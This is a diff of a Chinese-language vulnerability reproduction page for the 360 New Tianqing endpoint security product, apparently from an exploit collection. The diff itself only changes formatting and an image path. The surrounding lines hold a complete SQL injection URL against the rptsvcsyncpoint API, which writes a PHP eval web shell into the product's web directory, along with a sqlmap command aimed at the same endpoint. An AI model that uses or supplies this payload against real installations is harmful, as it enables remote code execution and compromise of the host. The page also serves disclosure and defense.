@@ -18,7 +18,7 @@ title="360新天擎"
 
 ## 漏洞复现
 
-```plain
+```
 注入写shell:
 https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--  
 
@@ -31,15 +31,10 @@ https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT
 5. 删除 表O
 ```
 
-
-
 使用命令
 
-```plain
+```
 sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL
 ```
 
-
-
-![image-20220209200650958](images/202202092006296.png)
-
+![image-20220209200650958](../.gitbook/assets/202202092006296.png)
